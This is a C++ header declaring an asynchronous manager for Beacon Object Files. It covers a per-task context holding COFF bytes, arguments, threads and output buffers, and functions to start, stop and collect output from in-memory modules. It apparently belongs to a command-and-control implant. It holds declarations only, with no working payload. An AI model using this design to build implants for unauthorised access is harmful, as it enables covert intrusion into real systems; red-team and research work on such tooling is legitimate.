#pragma once

#include "std.cpp"
#include "Packer.h"
#include "ApiLoader.h"
#include "bof_loader.h"

#define ASYNC_BOF_STATE_PENDING   0x0
#define ASYNC_BOF_STATE_RUNNING   0x1
#define ASYNC_BOF_STATE_FINISHED  0x2
#define ASYNC_BOF_STATE_STOPPED   0x3

#define ASYNC_BOF_OUTPUT_BUFFER_SIZE 0x10000

struct AsyncBofContext {
    ULONG   taskId;
    ULONG   state;
    HANDLE  hThread;
    DWORD   threadId;
    HANDLE  hStopEvent;
    
    BYTE*   coffFile;
    ULONG   coffFileSize;
    BYTE*   args;
    ULONG   argsSize;
    CHAR*   entryName;
    
    CRITICAL_SECTION outputLock;
    Packer* outputBuffer;
    
    PCHAR   mapSections[MAX_SECTIONS];
    LPVOID* mapFunctions;
};

AsyncBofContext* Boffer_GetCurrentAsyncBofContext(void);

typedef struct _Boffer {
    Vector<AsyncBofContext*> asyncBofs;
    
    HANDLE  wakeupEvent;
    CRITICAL_SECTION managerLock;
} Boffer;

Boffer* Boffer_Create();
void Boffer_Destroy(Boffer* self);
BOOL Boffer_Initialize(Boffer* self);
AsyncBofContext* Boffer_CreateAsyncBof(Boffer* self, ULONG taskId, CHAR* entryName, BYTE* coffFile, ULONG coffFileSize, BYTE* args, ULONG argsSize);
BOOL Boffer_StartAsyncBof(Boffer* self, AsyncBofContext* ctx);
BOOL Boffer_StopAsyncBof(Boffer* self, ULONG taskId);
void Boffer_ProcessAsyncBofs(Boffer* self, Packer* outPacker);
void Boffer_CleanupFinishedBofs(Boffer* self);
AsyncBofContext* Boffer_FindBofByThreadId(Boffer* self, DWORD threadId);
HANDLE Boffer_GetWakeupEvent(Boffer* self);
void Boffer_SignalWakeup(Boffer* self);
void Boffer_CleanupBofContext(Boffer* self, AsyncBofContext* ctx);

extern Boffer* g_AsyncBofManager;

